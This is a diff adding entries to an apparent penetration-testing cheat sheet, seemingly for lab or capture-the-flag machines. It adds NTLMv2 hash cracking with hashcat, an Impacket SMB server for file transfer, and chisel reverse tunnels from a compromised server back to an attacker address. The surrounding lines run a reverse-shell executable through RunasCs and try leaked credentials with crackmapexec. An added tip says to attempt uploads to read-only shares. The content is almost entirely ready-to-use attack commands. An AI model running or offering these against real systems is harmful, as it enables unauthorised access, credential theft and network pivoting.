@@ -26,6 +26,8 @@
   - [Rubeus](#rubeus)
   - [Impacket](#impacket)
   - [Invoke-RunasCs.ps1](#invoke-runascs.ps1)
+  - [smbserver](#smbserver)
+  - [chisel](#chisel)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
@@ -366,6 +368,10 @@ hashcat -h | grep -i "kerberos"
 
 # TGS-REP
 hashcat -m 13100 mssql /usr/share/wordlists/rockyou.txt --force
+
+# NTLMv2
+hashcat -m 5600 thecybergeek /usr/share/wordlists/rockyou.txt --force
+
 ```
 
 ### John The Ripper
@@ -418,6 +424,24 @@ Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
 Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command .\revshell443.exe
 ```
 
+### smbserver
+```bash
+sudo smbserver.py -smb2support share $(pwd)
+sudo smbserver.py -smb2support share $(pwd) -user kali -password kali
+```
+
+### chisel
+```bash
+#chisel
+#Run command on attacker machine
+chisel server -p 8888 --reverse
+#<socks>Run command on Web Server machine
+ .  .\chisel.exe client <% tp.frontmatter["LHOST"] %>:8001 R:1080:socks
+and edit the proxychains with the port that chisel provided
+
+#When trying to connect to a local port
+C:\\xampp\\htdocs>.\\chisel.exe client 192.168.45.176:8888 R:8090:localhost:80
+```
 
 
 # SSH
@@ -552,6 +576,8 @@ crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.
 crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
 
 # smbclient
+## Even when it says the user can only read, TRY uploading something anyway!
+
 ## anon
 smbclient -L 10.10.10.175 -N
 smbclient -L 10.10.10.175 -U "Egotistical-bank.local/fsmith"
